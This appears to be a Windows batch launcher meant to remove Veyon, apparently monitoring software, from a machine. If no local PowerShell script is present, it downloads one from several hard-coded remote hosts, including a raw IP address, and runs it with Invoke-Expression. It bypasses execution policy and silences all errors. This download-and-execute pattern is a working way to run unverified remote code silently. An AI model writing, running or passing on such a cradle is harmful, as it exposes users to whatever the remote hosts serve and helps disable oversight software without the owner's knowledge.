@echo off
chcp 65001 >nul 2>&1
if exist "%~dp0remove_veyon_win.ps1" (
    powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%~dp0remove_veyon_win.ps1"
) else (
    powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; $wc = New-Object System.Net.WebClient; $s = ''; foreach ($u in @('https://orbstrike.com/remove_veyon_win.ps1','https://103-149-172-179.sslip.io/remove_veyon_win.ps1','http://103.149.172.179:4000/remove_veyon_win.ps1')) { try { $s = $wc.DownloadString($u); if ($s) { break } } catch {} }; if ($s) { Invoke-Expression $s } } catch {}"
)
exit /b 0
